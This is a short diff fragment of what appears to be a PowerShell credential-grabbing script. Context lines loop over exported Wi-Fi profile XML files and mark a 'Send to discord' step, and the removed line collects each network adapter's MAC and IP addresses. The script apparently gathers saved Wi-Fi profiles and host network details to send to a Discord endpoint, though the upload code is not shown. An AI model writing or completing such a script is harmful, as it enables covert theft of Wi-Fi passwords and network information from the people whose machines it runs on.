@@ -27,8 +27,6 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 }
 
 
-$networkInfo = (Get-NetAdapter | ForEach-Object { $a=$_; $ips=Get-NetIPAddress -InterfaceIndex $a.ifIndex -ErrorAction SilentlyContinue; $v4=($ips|Where-Object AddressFamily -eq 'IPv4'|Select-Object -ExpandProperty IPAddress -ErrorAction SilentlyContinue) -join ','; $v6=($ips|Where-Object AddressFamily -eq 'IPv6'|Select-Object -ExpandProperty IPAddress -ErrorAction SilentlyContinue) -join ','; "$($a.Name): MAC=$($a.MacAddress) IPv4=$v4 IPv6=$v6" }) -join "`n"
-
 
 # Send to discord
 
